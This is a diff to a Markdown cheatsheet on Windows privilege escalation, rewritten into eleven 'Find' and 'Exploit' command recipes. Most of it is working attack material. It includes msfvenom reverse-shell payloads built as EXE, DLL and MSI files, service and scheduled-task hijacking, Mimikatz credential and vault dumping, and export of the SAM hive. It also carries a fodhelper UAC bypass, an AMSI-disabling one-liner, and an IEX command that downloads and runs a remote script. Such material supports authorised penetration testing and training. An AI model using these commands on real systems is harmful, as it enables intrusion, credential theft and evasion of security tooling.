@@ -1,170 +1,205 @@
-# Windows Privilege Escalation Cheatsheet 🚀
+# Windows Privesc Exploitation Cheatsheet
 
-This cheatsheet provides a quick reference for common tools and commands used to identify and exploit privilege escalation vulnerabilities on Windows systems.
+This cheatsheet provides the specific "Find" and "Exploit" commands for the 11 Windows privilege escalation techniques.
 
 ---
 
-## ## 1. Initial Enumeration & Situational Awareness
+### ## 1. Enumeration / Basic Commands
 
-All privilege escalation begins with understanding the system you are on. **Always start here.**
+The goal of enumeration is to gather intelligence for other exploits. The "exploit" is the act of gathering the data.
 
-### ### Manual Enumeration Commands
-* **Purpose:** To get a baseline understanding of the user, system, and network.
-* **Commands:**
+* **Exploit Commands:**
     ```powershell
-    # Check current user, groups, and privileges
+    rem -- Check user, groups, and privileges
     whoami /all
 
-    # Get OS version and patch level
-    systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+    rem -- Get OS and patch info for kernel exploits
+    systeminfo
 
-    # List running processes and their owners
-    tasklist /V
+    rem -- Find interesting running services
+    tasklist /SVC
 
-    # List configured services
-    sc query
-
-    # Check network configuration and listening ports
-    netstat -ano
+    rem -- Automatically find low-hanging fruit
+    .\winPEASx64.exe -quiet
     ```
 
-### ### Automated Enumeration Scripts
-* **Purpose:** To automatically scan for a wide range of common misconfigurations and vulnerabilities.
-* **Tools & Commands:**
-    * **WinPEAS:**
-        ```powershell
-        # Execute the script and save the colorized output
-        .\winPEASx64.exe -quiet -outputfile report.txt
-        ```
-    * **PowerUp.ps1:**
-        ```powershell
-        # Import the module and run all checks
-        powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
-        ```
-
 ---
 
-## ## 2. Service Misconfigurations
+### ## 2. Weak Service Permissions
 
-This is one of the most common vectors for privilege escalation to **SYSTEM**.
+Hijack a service your user has permission to modify.
 
-### ### Unquoted Service Paths
-* **Purpose:** Find services with paths that contain spaces and are not enclosed in quotes, allowing for hijacking.
-* **Command (WMIC):**
+* **Find:**
     ```powershell
-    wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
+    accesschk.exe /accepteula -uwcqv "Users" *
+    ```
+* **Exploit Commands:**
+    ```powershell
+    rem -- Reconfigure the service's binary to your payload
+    sc config <VulnSvc> binPath= "C:\tmp\payload.exe"
+
+    rem -- Restart the service to execute the payload as SYSTEM
+    sc stop <VulnSvc>
+    sc start <VulnSvc>
     ```
 
-### ### Weak Service Permissions
-* **Purpose:** Check if a low-privileged user can modify a service that runs with higher privileges.
-* **Tools & Commands:**
-    * **accesschk.exe (Sysinternals):** Checks permissions for the "Users" group on all services.
-        ```powershell
-        accesschk.exe /accepteula -uwcqv Users *
-        ```
-    * **sc.exe (built-in):** If a service is found to be modifiable, reconfigure its binary path to your payload and restart it.
-        ```powershell
-        # Reconfigure the service to point to your payload
-        sc config <service_name> binPath= "C:\tmp\payload.exe"
-
-        # Restart the service to trigger the payload
-        sc stop <service_name>
-        sc start <service_name>
-        ```
-
 ---
 
-## ## 3. Credential & Token Abuse
+### ## 3. Unquoted Service Paths
 
-Leveraging stored credentials or abusing user privileges.
+Exploit a service path with spaces that is not enclosed in quotes.
 
-### ### Impersonation Privileges (SeImpersonate/SeAssignPrimaryToken)
-* **Purpose:** Abuse powerful privileges, often held by service accounts, to impersonate the **SYSTEM** user.
-* **Tools & Commands:**
-    * **PrintSpoofer:** A reliable tool for exploiting this.
-        ```powershell
-        # Check for the privilege first
-        whoami /priv
-
-        # Use PrintSpoofer to spawn a command prompt as SYSTEM
-        PrintSpoofer.exe -i -c cmd.exe
-        ```
-    * **Juicy Potato / Rotten Potato:** Older tools for the same purpose.
-
-### ### Stored Credentials & Secrets
-* **Purpose:** Find saved passwords or hashes in files, the registry, or credential manager.
-* **Tools & Commands:**
-    * **cmdkey:** Lists credentials saved in the Windows Vault.
-        ```powershell
-        cmdkey /list
-        ```
-    * **Mimikatz (Requires Admin):** Dumps credentials from memory.
-        ```powershell
-        # Get debug rights first
-        privilege::debug
-
-        # Dump credentials from the LSA process
-        sekurlsa::logonpasswords
-        ```
-    * **Search for password files:**
-        ```powershell
-        dir /s /b *pass*.xml *pass*.txt *config* | findstr /i "password"
-        reg query HKLM /f password /t REG_SZ /s
-        ```
-
----
-
-## ## 4. Registry Misconfigurations
-
-### ### AlwaysInstallElevated
-* **Purpose:** Checks for a policy that allows any user to install `.msi` packages with **SYSTEM** privileges.
-* **Command (reg query):**
+* **Find:**
     ```powershell
-    # Check if both registry keys are set to '1'
-    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+    wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v "\""
+    ```
+* **Exploit Commands:**
+    ```powershell
+    rem -- Create a malicious executable named after the first part of the path
+    rem -- e.g., for "C:\Program Files\App\vuln.exe", name it "Program.exe"
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f exe -o Program.exe
+
+    rem -- Place the payload in the higher-level path and restart the service
+    copy Program.exe "C:\"
+    sc stop <VulnSvc>
+    sc start <VulnSvc>
+    ```
+
+---
+
+### ## 4. SeImpersonate / SeAssignPrimaryToken Privilege Escalation
+
+Abuse token impersonation privileges to become **SYSTEM**.
+
+* **Find:**
+    ```powershell
+    whoami /priv
+    ```
+* **Exploit Command:**
+    ```powershell
+    rem -- Use a tool like PrintSpoofer to get a SYSTEM shell
+    PrintSpoofer.exe -i -c "cmd.exe"
+    ```
+
+---
+
+### ## 5. DLL Hijacking
+
+Load a malicious DLL into a privileged application.
+
+* **Find:** Use **ProcMon.exe** to find `NAME NOT FOUND` errors for `.dll` files.
+* **Exploit Commands:**
+    ```powershell
+    rem -- Create a malicious DLL with the same name as the missing one
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f dll -o vulnerable.dll
+
+    rem -- Place it in the writable directory and restart the application
+    copy vulnerable.dll "C:\Path\To\Writable\Folder\"
+    ```
+
+---
+
+### ## 6. Sensitive Files & Hashes (SAM/LSA Secrets)
+
+Extract credentials from files or memory.
+
+* **Find:**
+    ```powershell
+    rem -- Search for passwords in common config files
+    dir /s /b *unattended*.xml *web.config* *pass*.txt
+    ```
+* **Exploit Commands (Requires Admin):**
+    ```powershell
+    rem -- Dump hashes from LSA memory with Mimikatz
+    mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
+
+    rem -- Dump SAM and SYSTEM hives for offline cracking
+    reg save hklm\sam C:\tmp\sam.save
+    reg save hklm\system C:\tmp\system.save
+    ```
+
+---
+
+### ## 7. Windows Vault / Credential Manager
+
+Retrieve credentials saved by users.
+
+* **Exploit Commands:**
+    ```powershell
+    rem -- List all credentials stored in the vault
+    cmdkey /list
+
+    rem -- Dump vault credentials with Mimikatz
+    mimikatz.exe "vault::cred" exit
+    ```
+
+---
+
+### ## 8. Scheduled Tasks
+
+Hijack a privileged task that points to a writable file.
+
+* **Find:**
+    ```powershell
+    rem -- List tasks and then check permissions on the target binary
+    schtasks /query /fo LIST /v
+    icacls "C:\Path\To\TaskBinary.exe"
+    ```
+* **Exploit Commands:**
+    ```powershell
+    rem -- Overwrite the writable binary with your payload
+    rem -- The original binary will be replaced. The task will run your payload on its next trigger.
+    copy /Y C:\tmp\payload.exe "C:\Path\To\TaskBinary.exe"
+    ```
+
+---
+
+### ## 9. AlwaysInstallElevated
+
+Install an MSI package with **SYSTEM** privileges.
+
+* **Find:**
+    ```powershell
+    rem -- Check if both registry keys are set to 1
     reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
     ```
-* **Exploitation:**
-    ```bash
-    # 1. Create a malicious MSI payload with msfvenom
-    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Your_IP> LPORT=4444 -f msi -o malicious.msi
+* **Exploit Commands:**
+    ```powershell
+    rem -- Create a malicious MSI installer
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f msi -o payload.msi
 
-    # 2. Run the installer on the target machine (it will execute as SYSTEM)
-    msiexec /quiet /qn /i C:\tmp\malicious.msi
+    rem -- Run the installer on the target machine with no admin rights needed
+    msiexec /quiet /qn /i C:\tmp\payload.msi
     ```
 
 ---
 
-## ## 5. File & Folder Permission Issues
+### ## 10. UAC Bypass
 
-### ### Insecure GUI Applications
-* **Purpose:** If you have a low-privilege shell but can interact with a GUI application running as a higher user, you can use the "File -> Open" dialog to browse the file system and execute programs (like `cmd.exe`) with that user's privileges.
+Elevate from a medium-integrity shell to a high-integrity shell.
 
-### ### Modifiable Scheduled Tasks
-* **Purpose:** Find scheduled tasks that run as **SYSTEM** but execute a script or binary that is writable by your user.
-* **Tools & Commands:**
-    * **schtasks:** List all scheduled tasks and their details.
-        ```powershell
-        schtasks /query /fo LIST /v
-        ```
-    * **icacls:** Check the permissions on the target file executed by the task.
-        ```powershell
-        icacls "C:\Path\To\Task\Executable.exe"
-        ```
+* **Find:** Check UAC settings and the Windows build number.
+* **Exploit Command (Example using fodhelper):**
+    ```powershell
+    rem -- Hijack the registry key that fodhelper.exe reads from
+    reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "C:\tmp\payload.exe" /f
+
+    rem -- Execute fodhelper.exe to trigger the payload in a high-integrity context
+    fodhelper.exe
+    ```
 
 ---
 
-## ## 6. Kernel Exploits
+### ## 11. AMSI Bypass
 
-This should be a last resort, as kernel exploits can be unstable.
+Disable anti-malware scanning for your current PowerShell session.
 
-### ### Windows Exploit Suggester
-* **Purpose:** Compares the target system's patch level (`systeminfo`) against a database of known kernel exploits.
-* **Tools & Commands:**
-    ```bash
-    # 1. On the target, get system info
-    systeminfo > systeminfo.txt
+* **Exploit Command:**
+    ```powershell
+    rem -- Run this command first in your PowerShell session
+    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
-    # 2. On your attacker machine, run the tool
-    python2 windows-exploit-suggester.py --database 2025-09-02-mssb.xls --systeminfo systeminfo.txt
+    rem -- Now you can run enumeration scripts like PowerUp without being blocked
+    IEX (New-Object Net.WebClient).DownloadString('http://<IP>/PowerUp.ps1'); Invoke-AllChecks
     ```
